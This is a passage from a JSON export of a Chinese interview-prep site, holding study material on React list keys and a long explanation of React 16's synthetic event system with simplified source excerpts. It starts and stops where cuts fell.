在渲染顺序变化时的影响**\n- 当列表的渲染顺序发生变化时，React 会基于 `key` 来对比和复用 DOM 元素。\n\n**考察点：**\n- 如何确保正确使用 `key` 处理顺序变化的渲染问题？\n\n```jsx\nconst items = [1, 2, 3];\n\nconst [state, setState] = useState(items);\n\n// 在按下按钮时交换第一个和第三个项\nconst handleSwap = () => {\n  setState([state[2], state[1], state[0]]);\n};\n\nreturn (\n  <div>\n    <button onClick={handleSwap}>Swap</button>\n    <ul>\n      {state.map((item) => (\n        <li key={item}>{item}</li>\n      ))}\n    </ul>\n  </div>\n);\n```\n\n---\n\n## **3. 列表与 `key` 的性能优化**\n\n### **(1) 批量更新与最小化重渲染**\n- 通过正确使用 `key`，React 可以最小化每次更新时的 DOM 重排，提高性能。\n- 如何避免频繁的重新渲染？例如，列表数据的更新可以通过局部更新而不是完全重新渲染。\n\n**考察点：**\n- `key` 如何帮助 React 识别和更新仅发生变化的元素？\n- 如何确保高效更新组件，避免重新渲染整个列表？\n\n### **(2) 列表更新时的 DOM 操作**\n- 在 `key` 使用得当时，React 可以只更新被修改的 DOM 元素，不需要完全重渲染整个列表。\n\n**考察点：**\n- `key` 如何帮助 React 更智能地进行 DOM 比对和更新？\n\n### **(3) 虚拟化大数据列表**\n- 对于大数据列表的渲染，React 可能会通过 **虚拟化技术** 来优化渲染过程，仅渲染视口内可见的元素。\n- 使用如 **react-window** 或 **react-virtualized** 等库，虚拟化列表提高性能。\n\n**考察点：**\n- 对于大数据量的列表，如何通过虚拟化减少 DOM 渲染，提高性能？\n- `key` 在这些库中如何发挥作用？\n\n---\n\n## **4. 注意事项与常见问题**\n\n### **(1) 不应使用索引作为 `key`**\n- 在列表项发生动态变化（如排序、删除等）时，如果使用 `index` 作为 `key`，可能会导致不必要的 DOM 重渲染或渲染错误。\n- 在列表项删除或排序时，React 会误将某些元素复用，导致状态丢失或样式错误。\n\n**考察点：**\n- 为什么使用 `index` 作为 `key` 可能会带来问题？举例说明。\n\n### **(2) `key` 与组件状态**\n- 在更新列表时，组件的状态也可能会受到影响，如何确保在更新时保持每个元素的状态。\n\n**考察点：**\n- 如何处理列表项状态在排序、插入、删除时不丢失？",
    "exerciseKeyList": "[\"1e01a341-f1c4-490b-966d-32433edd42bf\",\"dfc9b600-74ec-4e03-8832-c3d69de4dcea\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 1,
    "createAt": "2024-12-17T09:35:11.000Z",
    "updateAt": "2025-02-11T02:46:41.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "1e01a341-f1c4-490b-966d-32433edd42bf",
        "title": "React中为什么要给组件设置 key？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T12:04:26.000Z",
        "updateAt": "2021-07-04T21:29:37.000Z"
      },
      {
        "exerciseKey": "dfc9b600-74ec-4e03-8832-c3d69de4dcea",
        "title": "为什么不能用数组下标来作为react组件中的key？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T11:02:02.000Z",
        "updateAt": "2021-07-04T21:30:58.000Z"
      }
    ]
  },
  "201": {
    "id": 201,
    "tagId": 13,
    "title": "react 事件机制",
    "explanation": "# 一 前言\n\n我们来一起探讨一下`React`事件原理，这篇文章，我尽量用通俗简洁的方式，把`React`事件系统讲的明明白白。\n\n我们讲的`react`版本是`16.13.1` , `v17`之后`react`对于事件系统会有相关的改版，文章后半部分会提及。\n\n老规矩，在正式讲解`react`之前，我们先想想这几个问题(**如果我是面试官，你会怎么回答?**)：\n\n-   我们写的事件是绑定在`dom`上么，如果不是绑定在哪里？\n-   为什么我们的事件不能绑定给组件？\n-   为什么我们的事件手动绑定`this`(不是箭头函数的情况)\n-   为什么不能用 `return false` 来阻止事件的默认行为？\n-   `react`怎么通过`dom`元素，找到与之对应的 `fiber`对象的？\n-   `onClick`是在冒泡阶段绑定的？ 那么`onClickCapture`就是在事件捕获阶段绑定的吗？\n\n![B7836791-2C40-48BA-83BF-835E0BD87B55.jpg](https://static.ecool.fun//article/b80c857e-f196-48f5-87c9-94e08adf3748.awebp)\n\n## 必要的知识概念\n\n在弄清楚`react`事件之前，有几个概念我们必须弄清楚，因为只有弄明白这几个概念，在事件触发阶段，我们才能更好的理解`react`处理事件本质。\n\n### 我们写在JSX事件终将变成什么？\n\n我们先写一段含有点击事件的`react JSX`语法，看一下它最终会变成什么样子？\n\n```js\nclass Index extends React.Component{\n    handerClick= (value) => console.log(value) \n    render(){\n        return <div>\n            <button onClick={ this.handerClick } > 按钮点击 </button>\n        </div>\n    }\n}\n```\n\n经过`babel`转换成`React.createElement`形式，如下：\n\n![babel.jpg](https://static.ecool.fun//article/364a6a52-d743-4bd8-8b29-783352ef186c.awebp)\n\n最终转成`fiber`对象形式如下：\n\n![fiber.jpg](https://static.ecool.fun//article/1a417e0f-6ef4-4e8a-9745-c3579b36dcdd.awebp)\n\n`fiber`对象上的`memoizedProps` 和 `pendingProps`保存了我们的事件。\n\n### 什么是合成事件？\n\n通过上一步我们看到了，我们声明事件保存的位置。但是事件有没有被真正的注册呢？我们接下来看一下：\n\n我们看一下当前这个元素`<button>`上有没有绑定这个事件监听器呢？\n\n![button_event.jpg](https://static.ecool.fun//article/95da9a68-21fe-48b0-8382-88854fcdb8bd.awebp)\n\n**button上绑定的事件**\n\n我们可以看到 ，`button`上绑定了两个事件，一个是`document`上的事件监听器，另外一个是`button`，但是事件处理函数`handle`，并不是我们的`handerClick`事件，而是`noop`。\n\n`noop`是什么呢？我们接着来看。\n\n原来`noop`就指向一个空函数。\n\n![noop.jpg](https://static.ecool.fun//article/89b3b43d-35b8-47ec-bb8b-b88c84f84ab2.awebp)\n\n**然后我们看`document`绑定的事件**\n\n![document.jpg](https://static.ecool.fun//article/fdda64b6-8723-4401-bd95-efcc25c8f0fd.awebp)\n\n可以看到`click`事件被绑定在`document`上了。\n\n接下来我们再搞搞事情😂😂😂，在`demo`项目中加上一个`input`输入框，并绑定一个`onChange`事件。睁大眼睛看看接下来会发生什么？\n\n```js\nclass Index extends React.Component{\n    componentDidMount(){\n        console.log(this)\n    }\n    handerClick= (value) => console.log(value) \n    handerChange=(value) => console.log(value)\n    render(){\n        return <div style={{ marginTop:'50px' }} >\n            <button onClick={ this.handerClick } > 按钮点击 </button>\n            <input  placeholder=\"请输入内容\" onChange={ this.handerChange }  />\n        </div>\n    }\n}\n```\n\n**我们先看一下`input dom`元素上绑定的事件**\n\n![22BEC470-233A-4C50-9C47-D21D343C055D.jpg](https://static.ecool.fun//article/4714cc25-21ed-4b36-be74-80a1a38fc9be.awebp)\n\n**然后我们看一下`document`上绑定的事件**\n\n![8E1D3BDB-ACFB-4E49-A5FF-CF990C47A60E.jpg](https://static.ecool.fun//article/f51374b3-c07f-4134-9b57-ed88451cf3fb.awebp)\n\n我们发现，我们给`<input>`绑定的`onChange`，并没有直接绑定在`input`上，而是统一绑定在了`document`上，然后我们`onChange`被处理成很多事件监听器，比如`blur` , `change` , `input` , `keydown` , `keyup` 等。\n\n综上我们可以得出结论：\n\n-   ①**我们在 `jsx` 中绑定的事件(demo中的`handerClick`，`handerChange`),根本就没有注册到真实的`dom`上。是绑定在`document`上统一管理的。**\n    \n-   ②**真实的`dom`上的`click`事件被单独处理,已经被`react`底层替换成空函数。**\n    \n-   ③**我们在`react`绑定的事件,比如`onChange`，在`document`上，可能有多个事件与之对应。**\n    \n-   ④ **`react`并不是一开始，把所有的事件都绑定在`document`上，而是采取了一种按需绑定，比如发现了`onClick`事件,再去绑定`document click`事件。**\n    \n\n那么什么是`react`事件合成呢？\n\n**在`react`中，我们绑定的事件`onClick`等，并不是原生事件，而是由原生事件合成的`React`事件，比如 `click`事件合成为`onClick`事件。比如`blur` , `change` , `input` , `keydown` , `keyup`等 , 合成为`onChange`。**\n\n那么`react`采取这种事件合成的模式呢？\n\n一方面，将事件绑定在`document`统一管理，防止很多事件直接绑定在原生的`dom`元素上。造成一些不可控的情况\n\n另一方面， `React` 想实现一个全浏览器的框架， 为了实现这种目标就需要提供全浏览器一致性的事件系统，以此抹平不同浏览器的差异。\n\n接下来的文章中，会介绍`react`是怎么做事件合成的。\n\n### dom元素对应的fiber Tag对象\n\n我们知道了`react`怎么储存了我们的事件函数和事件合成因果。接下来我想让大家记住一种类型的 `fiber` 对象,因为后面会用到，这对后续的理解很有帮助。\n\n我们先来看一个代码片段：\n\n```js\n<div> \n  <div> hello , my name is alien </div>\n</div>\n```\n\n看 `<div> hello , my name is alien </div>` 对应的 `fiber`类型。 tag = 5\n\n![B7514E02-E542-4BDC-8CF3-F198D094A9D3.jpg](https://static.ecool.fun//article/5029da68-44ef-40c5-bbaf-55967c615679.awebp) 然后我们去`react`源码中找到这种类的`fiber`类型。\n\n> /react-reconciler/src/ReactWorkTagsq.js\n\n```js\nexport const HostComponent = 5; // 元素节点\n\n```\n\n好的 ，我们暂且把 `HostComponent` 和 `HostText`记录📝下来。接下来回归正题，我们先来看看`react`事件合成机制。\n\n# 二 事件初始化-事件合成，插件机制\n\n接下来，我们来看一看`react`这么处理事件合成的。首先我们从上面我们知道，`react`并不是一次性把所有事件都**绑定进去**，而是如果发现项目中有`onClick`，才绑定`click`事件，发现有`onChange`事件，才绑定`blur` , `change` , `input` , `keydown` , `keyup`等。 所以为了把原理搞的清清楚楚，笔者把事件原理分成三部分来搞定：\n\n-   1 `react`对事件是如何合成的。\n-   2 `react`事件是怎么绑定的。\n-   3 `react`事件触发流程。\n\n## 事件合成-事件插件\n\n### 1 必要概念\n\n我们先来看来几个常量关系，这对于我们吃透`react`事件原理很有帮助。在解析来的讲解中，我也会讲到这几个对象如何来的，具体有什么作用。\n\n#### ①namesToPlugins\n\n第一个概念：**namesToPlugins** 装事件名 -> 事件模块插件的映射,`namesToPlugins`最终的样子如下：\n\n```js\nconst namesToPlugins = {\n    SimpleEventPlugin,\n    EnterLeaveEventPlugin,\n    ChangeEventPlugin,\n    SelectEventPlugin,\n    BeforeInputEventPlugin,\n}\n```\n\n`SimpleEventPlugin`等是处理各个事件函数的插件，比如一次点击事件，就会找到`SimpleEventPlugin`对应的处理函数。我们先记录下它，至于具体有什么作用，接下来会讲到。\n\n#### ②plugins\n\n`plugins`，这个对象就是上面注册的所有插件列表,初始化为空。\n\n```js\nconst  plugins = [LegacySimpleEventPlugin, LegacyEnterLeaveEventPlugin, ...];\n```\n\n#### ③registrationNameModules\n\n`registrationNameModules`记录了React合成的事件-对应的事件插件的关系，在`React`中，处理`props`中事件的时候，会根据不同的事件名称，找到对应的事件插件，然后统一绑定在`document`上。对于没有出现过的事件，就不会绑定，我们接下来会讲到。`registrationNameModules`大致的样子如下所示。\n\n```js\n{\n    onBlur: SimpleEventPlugin,\n    onClick: SimpleEventPlugin,\n    onClickCapture: SimpleEventPlugin,\n    onChange: ChangeEventPlugin,\n    onChangeCapture: ChangeEventPlugin,\n    onMouseEnter: EnterLeaveEventPlugin,\n    onMouseLeave: EnterLeaveEventPlugin,\n    ...\n}\n```\n\n#### ④事件插件\n\n那么我们首先就要搞清楚，`SimpleEventPlugin`,`EnterLeaveEventPlugin`每个插件都是什么？我们拿`SimpleEventPlugin`为例，看一下它究竟是什么样子？\n\n```js\nconst SimpleEventPlugin = {\n    eventTypes:{ \n        'click':{ /* 处理点击事件  */\n            phasedRegistrationNames:{\n                bubbled: 'onClick',       // 对应的事件冒泡 - onClick \n                captured:'onClickCapture' //对应事件捕获阶段 - onClickCapture\n            },\n            dependencies: ['click'], //事件依赖\n            ...\n        },\n        'blur':{ /* 处理失去焦点事件 */ },\n        ...\n    }\n    extractEvents:function(topLevelType,targetInst,){ /* eventTypes 里面的事件对应的统一事件处理函数，接下来会重点讲到 */ }\n}\n```\n\n首先事件插件是一个对象，有两个属性，第一个`extractEvents`作为事件统一处理函数，第二个`eventTypes`是一个对象，对象保存了原生事件名和对应的配置项`dispatchConfig`的映射关系。由于v16React的事件是统一绑定在`document`上的，React用独特的事件名称比如`onClick`和`onClickCapture`，来说明我们给绑定的函数到底是在冒泡事件阶段，还是捕获事件阶段执行。\n\n#### ⑤ registrationNameDependencies\n\n`registrationNameDependencies`用来记录，合成事件比如 `onClick` 和原生事件 `click`对应关系。比如 `onChange` 对应 `change` , `input` , `keydown` , `keyup`事件。\n\n```js\n{\n    onBlur: ['blur'],\n    onClick: ['click'],\n    onClickCapture: ['click'],\n    onChange: ['blur', 'change', 'click', 'focus', 'input', 'keydown', 'keyup', 'selectionchange'],\n    onMouseEnter: ['mouseout', 'mouseover'],\n    onMouseLeave: ['mouseout', 'mouseover'],\n    ...\n}\n```\n\n### 2 事件初始化\n\n对于事件合成，`v16.13.1`版本`react`采用了初始化注册方式。\n\n> react-dom/src/client/ReactDOMClientInjection.js\n\n```js\n/* 第一步：注册事件：  */\ninjectEventPluginsByName({\n    SimpleEventPlugin: SimpleEventPlugin,\n    EnterLeaveEventPlugin: EnterLeaveEventPlugin,\n    ChangeEventPlugin: ChangeEventPlugin,\n    SelectEventPlugin: SelectEventPlugin,\n    BeforeInputEventPlugin: BeforeInputEventPlugin,\n});\n```\n\n`injectEventPluginsByName` 这个函数具体有什么用呢，它在`react`底层是默认执行的。我们来简化这个函数,看它到底是干什么的。\n\n> legacy-event/EventPluginRegistry.js\n\n```js\n/* 注册事件插件 */\nexport function injectEventPluginsByName(injectedNamesToPlugins){\n     for (const pluginName in injectedNamesToPlugins) {\n         namesToPlugins[pluginName] = injectedNamesToPlugins[pluginName]\n     }\n     recomputePluginOrdering()\n}\n```\n\n`injectEventPluginsByName`做的事情很简单，形成上述的`namesToPlugins`，然后执行`recomputePluginOrdering`，我们接下来看一下`recomputePluginOrdering`做了写什么？\n\n```js\nconst eventPluginOrder = [ 'SimpleEventPlugin' , 'EnterLeaveEventPlugin','ChangeEventPlugin','SelectEventPlugin' , 'BeforeInputEventPlugin' ]\n\nfunction recomputePluginOrdering(){\n    for (const pluginName in namesToPlugins) {\n        /* 找到对应的事件处理插件，比如 SimpleEventPlugin  */\n        const pluginModule = namesToPlugins[pluginName];\n        const pluginIndex = eventPluginOrder.indexOf(pluginName);\n        /* 填充 plugins 数组  */\n        plugins[pluginIndex] = pluginModule;\n        const publishedEvents = pluginModule.eventTypes;\n    for (const eventName in publishedEvents) {\n       // publishedEvents[eventName] -> eventConfig , pluginModule -> 事件插件 ， eventName -> 事件名称\n        publishEventForPlugin(publishedEvents[eventName],pluginModule,eventName,)\n    } \n    }\n\n\n}\n\n```\n\n**recomputePluginOrdering**,作用很明确了，形成上面说的那个`plugins`,数组。然后就是**重点的函数`publishEventForPlugin`**。\n\n```js\n/*\n  dispatchConfig -> 原生事件对应配置项 { phasedRegistrationNames :{  冒泡 捕获  } ，   }\n  pluginModule -> 事件插件 比如SimpleEventPlugin  \n  eventName -> 原生事件名称。\n*/\nfunction publishEventForPlugin (dispatchConfig,pluginModule,eventName){\n    eventNameDispatchConfigs[eventName] = dispatchConfig;\n    /* 事件 */\n    const phasedRegistrationNames = dispatchConfig.phasedRegistrationNames;\n    if (phasedRegistrationNames) {\n    for (const phaseName in phasedRegistrationNames) {\n        if (phasedRegistrationNames.hasOwnProperty(phaseName)) {\n            // phasedRegistrationName React事件名 比如 onClick / onClickCapture\n            const phasedRegistrationName = phasedRegistrationNames[phaseName];\n            // 填充形成 registrationNameModules React 合成事件 -> React 处理事件插件映射关系\n            registrationNameModules[phasedRegistrationName] = pluginModule;\n            // 填充形成 registrationNameDependencies React 合成事件 -> 原生事件 映射关系\n            registrationNameDependencies[phasedRegistrationName] = pluginModule.eventTypes[eventName].dependencies;\n        }\n    }\n    return true;\n    }\n}\n```\n\n`publishEventForPlugin` 作用形成上述的 **`registrationNameModules`** 和 **`registrationNameDependencies`** 对象中的映射关系。\n\n### 3 事件合成总结\n\n到这里整个初始化阶段已经完事了，我来总结一下初始化事件合成都做了些什么。这个阶段主要形成了上述的几个重要对象，构建初始化React合成事件和原生事件的对应关系，合成事件和对应的事件处理插件关系。接下来就是事件绑定阶段。\n\n# 三 事件绑定-从一次点击事件开始\n\n## 事件绑定流程\n\n如果我们在一个组件中这么写一个点击事件，`React`会一步步如何处理。\n\n### 1 diffProperties 处理React合成事件\n\n```js\n<div>\n  <button onClick={ this.handerClick }  className=\"button\" >点击</button>\n</div>\n```\n\n第一步，首先通过上面的讲解，我们绑定给hostComponent种类的fiber(如上的button元素)，会 `button` 对应的fiber上，以`memoizedProps` 和 `pendingProps`形成保存。\n\n```js\nbutton 对应 fiber\nmemoizedProps = {\n   onClick:function handerClick(){},\n   className:'button'\n}\n```\n\n结构图如下所示：\n\n![58E6A4AF-1902-42BC-9D11-B47234037E01.jpg](https://static.ecool.fun//article/d4ae470e-a3da-431d-9e1e-cd326aa4ee10.awebp)\n\n第二步，React在调合子节点后，进入diff阶段，如果判断是`HostComponent`(dom元素)类型的fiber，会用diff props函数`diffProperties`单独处理。\n\n> react-dom/src/client/ReactDOMComponent.js\n\n```js\nfunction diffProperties(){\n    /* 判断当前的 propKey 是不是 React合成事件 */\n    if(registrationNameModules.hasOwnProperty(propKey)){\n         /* 这里多个函数简化了，如果是合成事件， 传入成事件名称 onClick ，向document注册事件  */\n         legacyListenToEvent(registrationName, document）;\n    }\n}\n```\n\n`diffProperties`函数在 `diff props` 如果发现是合成事件(`onClick`) 就会调用`legacyListenToEvent`函数。注册事件监听器。\n\n### 2 legacyListenToEvent 注册事件监听器\n\n> react-dom/src/events/DOMLegacyEventPluginSystem.js\n\n```js\n//  registrationName -> onClick 事件\n//  mountAt -> document or container\nfunction legacyListenToEvent(registrationName，mountAt){\n   const dependencies = registrationNameDependencies[registrationName]; // 根据 onClick 获取  onClick 依赖的事件数组 [ 'click' ]。\n    for (let i = 0; i < dependencies.length; i++) {\n    const dependency = dependencies[i];\n    //这个经过多个函数简化，如果是 click 基础事件，会走 legacyTrapBubbledEvent ,而且都是按照冒泡处理\n     legacyTrapBubbledEvent(dependency, mountAt);\n  }\n}\n```\n\nlegacyTrapBubbledEvent 就是执行将绑定真正的dom事件的函数 legacyTrapBubbledEvent(冒泡处理)。\n\n```js\nfunction legacyTrapBubbledEvent(topLevelType,element){\n   addTrappedEventListener(element,topLevelType,PLUGIN_EVENT_SYSTEM,false)\n}\n\n```\n\n第三步： 在`legacyListenToEvent`函数中，先找到 `React` 合成事件对应的原生事件集合，比如 onClick -> \\['click'\\] , onChange -> \\[`blur` , `change` , `input` , `keydown` , `keyup`\\]，然后遍历依赖项的数组，绑定事件，**这就解释了，为什么我们在刚开始的demo中，只给元素绑定了一个`onChange`事件，结果在`document`上出现很多事件监听器的原因，就是在这个函数上处理的。**\n\n我们上面已经透露了React是采用事件绑定，`React` 对于 `click` 等基础事件，会默认按照事件冒泡阶段的事件处理，**不过这也不绝对的，比如一些事件的处理，有些特殊的事件是按照事件捕获处理的。**\n\n```js\ncase TOP_SCROLL: {                                // scroll 事件\n    legacyTrapCapturedEvent(TOP_SCROLL, mountAt); // legacyTrapCapturedEvent 事件捕获处理。\n    break;\n}\ncase TOP_FOCUS: // focus 事件\ncase TOP_BLUR:  // blur 事件\nlegacyTrapCapturedEvent(TOP_FOCUS, mountAt);\nlegacyTrapCapturedEvent(TOP_BLUR, mountAt);\nbreak;\n```\n\n### 3 绑定 dispatchEvent，进行事件监听\n\n如上述的`scroll`事件，`focus` 事件 ，`blur`事件等，是默认按照事件捕获逻辑处理。接下来就是最重要关键的一步。React是如何绑定事件到`document`？ 事件处理函数函数又是什么？问题都指向了上述的`addTrappedEventListener`，让我们来揭开它的面纱。\n\n```js\n/*\n  targetContainer -> document\n  topLevelType ->  click\n  capture = false\n*/\nfunction addTrappedEventListener(targetContainer,topLevelType,eventSystemFlags,capture){\n   const listener = dispatchEvent.bind(null,topLevelType,eventSystemFlags,targetContainer) \n   if(capture){\n       // 事件捕获阶段处理函数。\n   }else{\n       /* TODO: 重要, 这里进行真正的事件绑定。*/\n      targetContainer.addEventListener(topLevelType,listener,false) // document.addEventListener('click',listener,false)\n   }\n}\n```\n\n第四步： 这个函数内容虽然不多，但是却非常重要,首先绑定我们的事件统一处理函数 `dispatchEvent`，绑定几个默认参数，事件类型 `topLevelType` demo中的`click` ，还有绑定的容器`doucment`。**然后真正的事件绑定,添加事件监听器`addEventListener`。** 事件绑定阶段完毕。\n\n### 4 事件绑定过程总结\n\n我们来做一下事件绑定阶段的总结。\n\n-   ① 在React，diff DOM元素类型的fiber的props的时候， 如果发现是React合成事件，比如`onClick`，会按照事件系统逻辑单独处理。\n-   ② 根据React合成事件类型，找到对应的原生事件的类型，然后调用判断原生事件类型，大部分事件都按照冒泡逻辑处理，少数事件会按照捕获逻辑处理（比如`scroll`事件）。\n-   ③ 调用 addTrappedEventListener 进行真正的事件绑定，绑定在`document`上，`dispatchEvent` 为统一的事件处理函数。\n-   ④ **有一点值得注意: 只有上述那几个特殊事件比如 `scorll`,`focus`,`blur`等是在事件捕获阶段发生的，其他的都是在事件冒泡阶段发生的，无论是`onClick`还是`onClickCapture`都是发生在冒泡阶段**，至于 React 本身怎么处理捕获逻辑的。我们接下来会讲到。\n\n# 四 事件触发-一次点击事件，在`react`底层系统会发生什么？\n\n```js\n<div>\n  <button onClick={ this.handerClick }  className=\"button\" >点击</button>\n</div>\n```\n\n还是上面这段代码片段，当点击一下按钮，在 `React` 底层会发生什么呢？接下来，让我共同探索事件触发的奥秘。\n\n## 事件触发处理函数 dispatchEvent\n\n我们在事件绑定阶段讲过，React事件注册时候，统一的监听器`dispatchEvent`，也就是当我们**点击按钮之后，\b首先执行的是`dispatchEvent`函数**，因为`dispatchEvent`前三个参数已经被bind了进去，所以真正的事件源对象`event`，被默认绑定成第四个参数。\n\n> react-dom/src/events/ReactDOMEventListener.js\n\n```js\nfunction dispatchEvent(topLevelType,eventSystemFlags,targetContainer,nativeEvent){\n    /* 尝试调度事件 */\n    const blockedOn = attemptToDispatchEvent( topLevelType,eventSystemFlags, targetContainer, nativeEvent);\n}\n```\n\n```js\n/*\ntopLevelType -> click\neventSystemFlags -> 1\ntargetContainer -> document\nnativeEvent -> 原生事件的 event 对象\n*/\nfunction attemptToDispatchEvent(topLevelType,eventSystemFlags,targetContainer,nativeEvent){\n    /* 获取原生事件 e.target */\n    const nativeEventTarget = getEventTarget(nativeEvent)\n    /* 获取\b当前事件，最近的dom类型fiber ，我们 demo中 button 按钮对应的 fiber */\n    let targetInst = getClosestInstanceFromNode(nativeEventTarget); \n    /* 重要：进入legacy模式的事件处理系统 */\n    dispatchEventForLegacyPluginEventSystem(topLevelType,eventSystemFlags,nativeEvent,targetInst,);\n    return null;\n}\n```\n\n在这个阶段主要做了这几件事：\n\n-   ① 首先根据真实的事件源对象，找到 `e.target` 真实的 `dom` 元素。\n-   ② 然后根据`dom`元素，找到与它对应的 `fiber` 对象`targetInst`，在我们 `demo` 中，找到 `button` 按钮对应的 `fiber`。\n-   ③ 然后正式进去`legacy`模式的事件处理系统，也就是我们目前用的React模式都是`legacy`模式下的，在这个模式下，批量更新原理，即将拉开帷幕。\n\n这里有一点问题，**`React`怎么样通过原生的`dom`元素，找到对应的`fiber`的呢？** ，也就是说 `getClosestInstanceFromNode` 原理是什么？\n\n答案是首先 `getClosestInstanceFromNode` 可以找到当前传入的 `dom` 对应的最近的元素类型的 `fiber` 对象。`React` 在初始化真实 `dom` 的时候，用一个随机的 `key internalInstanceKey` 指针指向了当前`dom`对应的`fiber`对象，`fiber`对象用`stateNode`指向了当前的`dom`元素。\n\n```js\n// 声明随机key\nvar internalInstanceKey = '__reactInternalInstance$' + randomKey;\n\n// 使用随机key \nfunction getClosestInstanceFromNode(targetNode){\n  // targetNode -dom  targetInst -> 与之对应的fiber对象\n  var targetInst = targetNode[internalInstanceKey];\n}\n```\n\n**在谷歌调试器上看**\n\n![fiber_dom.jpg](https://static.ecool.fun//article/7576dcb5-28ea-49c1-b6c0-56ab370323f0.awebp)\n\n**两者关系图**\n\n![dom_fiber.jpg](https://static.ecool.fun//article/5d4353d1-e1e9-4bd9-9088-6077c9a29cb2.awebp)\n\n## legacy 事件处理系统与批量更新\n\n> react-dom/src/events/DOMLegacyEventPluginSystem.js\n\n```js\n/* topLevelType - click事件 ｜ eventSystemFlags = 1 ｜ nativeEvent = 事件源对象  ｜ targetInst = 元素对应的fiber对象  */\nfunction dispatchEventForLegacyPluginEventSystem(topLevelType,eventSystemFlags,nativeEvent,targetInst){\n    /* 从React 事件池中取出一个，将 topLevelType ，targetInst 等属性赋予给事件  */\n    const bookKeeping = getTopLevelCallbackBookKeeping(topLevelType,nativeEvent,targetInst,eventSystemFlags);\n    try { /* 执行批量更新 handleTopLevel 为事件处理的主要函数 */\n    batchedEventUpdates(handleTopLevel, bookKeeping);\n  } finally {\n    /* 释放事件池 */  \n    releaseTopLevelCallbackBookKeeping(bookKeeping);\n  }\n}\n```\n\n对于v16事件池，我们接下来会讲到，首先 `batchedEventUpdates`为批量更新的主要函数。我们先来看看`batchedEventUpdates`\n\n> react-dom/src/events/ReactDOMUpdateBatching.js\n\n```js\nexport function batchedEventUpdates(fn,a){\n    isBatchingEventUpdates = true;\n    try{\n       fn(a) // handleTopLevel(bookKeeping)\n    }finally{\n        isBatchingEventUpdates = false\n    }\n}\n```\n\n批量更新简化成如上的样子，从上面我们可以看到，React通过开关`isBatchingEventUpdates`来控制是否启用批量更新。`fn(a)`，事件上调用的是 `handleTopLevel(bookKeeping)` ，由于js是单线程的，我们真正在组件中写的事件处理函数，比如demo 的 `handerClick`实际执行是在`handleTopLevel(bookKeeping)`中执行的。所以如果我们在`handerClick`里面触发`setState`，那么就能读取到 `isBatchingEventUpdates = true`这就是React的合成事件为什么具有批量更新的功能了。比如我们这么写\n\n```js\nstate={number:0}\nhanderClick = () =>{\n    this.setState({number: this.state.number + 1   })\n    console.log(this.state.number) //0\n    this.setState({number: this.state.number + 1   })\n    console.log(this.state.number) //0\n    setTimeout(()=>{\n        this.setState({number: this.state.number + 1   })\n        console.log(this.state.number) //2\n        this.setState({number: this.state.number + 1   })\n        console.log(this.state.number)// 3\n    })\n}\n```\n\n如上述所示，第一个`setState`和第二个`setState`在批量更新条件之内执行，所以打印不会是最新的值，但是如果是发生在`setTimeout`中,由于eventLoop 放在了下一次事件循环中执行，此时 batchedEventUpdates 中已经执行完`isBatchingEventUpdates = false`，所以批量更新被打破，我们就可以直接访问到最新变化的值了。\n\n接下来我们有两点没有梳理：\n\n-   一是React事件池概念\n-   二是最后的线索是执行`handleTopLevel(bookKeeping)`，那么`handleTopLevel`到底做了写什么。\n\n## 执行事件插件函数\n\n上面说到整个事件系统，最后指向函数 `handleTopLevel(bookKeeping)` 那么 `handleTopLevel` 到底做了什么事情？\n\n```js\n// 流程简化后\n// topLevelType - click  \n// targetInst - button Fiber\n// nativeEvent\nfunction handleTopLevel(bookKeeping){\n    const { topLevelType,targetInst,nativeEvent,eventTarget, eventSystemFlags} = bookKeeping\n    for(let i=0; i < plugins.length;i++ ){\n        const possiblePlugin = plugins[i];\n        /* 找到对应的事件插件，形成对应的合成event，形成事件执行队列  */\n        const  extractedEvents = possiblePlugin.extractEvents(topLevelType,targetInst,nativeEvent,eventTarget,eventSystemFlags)  \n    }\n    if (extractedEvents) {\n        events = accumulateInto(events, extractedEvents);\n    }\n    /* 执行事件处理函数 */\n    runEventsInBatch(events);\n}\n```\n\n我把整个流程简化，只保留了核心的流程，`handleTopLevel`最后的处理逻辑就是执行我们说的事件处理插件(SimpleEventPlugin)中的处理函数`extractEvents`，比如我们demo中的点击事件 onClick 最终走的就是 `SimpleEventPlugin` 中的 `extractEvents` 函数，那么React为什么这么做呢? 我们知道我们React是采取事件合成，事件统一绑定，并且我们写在组件中的事件处理函数( handerClick )，也不是真正的执行函数`dispatchAciton`，那么我们在`handerClick`的事件对象 `event`,也是React单独合成处理的，里面单独封装了比如 `stopPropagation`和`preventDefault`等方法，**这样的好处是，我们不需要跨浏览器单独处理兼容问题，交给React底层统一处理。**\n\n## extractEvents 形成事件对象event 和 事件处理函数队列\n\n**重点来了！重点来了！重点来了！**，extractEvents 可以作为整个事件系统核心函数，我们先回到最初的`demo`，如果我们这么写,那么四个回调函数，那么点击按钮，四个事件是如何处理的呢。首先如果点击按钮，最终走的就是`extractEvents`函数，一探究竟这个函数。\n\n> legacy-events/SyntheticEvent.js \b\n\n```js\nconst  SimpleEventPlugin = {\n    extractEvents:function(topLevelType,targetInst,nativeEvent,nativeEventTarget){\n        const dispatchConfig = topLevelEventsToDispatchConfig.get(topLevelType);\n        if (!dispatchConfig) {\n            return null;\n        }\n        switch(topLevelType){\n            default:\n            EventConstructor = SyntheticEvent;\n            break;\n        }\n        /* 产生事件源对象 */\n        const event = EventConstructor.getPooled(dispatchConfig,targetInst,nativeEvent,nativeEventTarget)\n        const phasedRegistrationNames = event.dispatchConfig.phasedRegistrationNames;\n        const dispatchListeners = [];\n        const {bubbled, captured} = phasedRegistrationNames; /* onClick / onClickCapture */\n        const dispatchInstances = [];\n        /* 从事件源开始逐渐向上，查找dom元素类型HostComponent对应的fiber ，收集上面的React合成事件，onClick / onClickCapture  */\n         while (instance !== null) {\n              const {stateNode, tag} = instance;\n              if (tag === HostComponent && stateNode !== null) { /* DOM 元素 */\n                   const currentTarget = stateNode;\n                   if (captured !== null) { /* 事件捕获 */\n                        /* 在事件捕获阶段,真正的事件处理函数 */\n                        const captureListener = getListener(instance, captured);\n                        if (captureListener != null) {\n                        /* 对应发生在事件捕获阶段的处理函数，逻辑是将执行函数unshift添加到队列的最前面 */\n                            dispatchListeners.unshift(captureListener);\n                            dispatchInstances.unshift(instance);\n                            dispatchCurrentTargets.unshift(currentTarget);\n                        }\n                    }\n                    if (bubbled !== null) { /* 事件冒泡 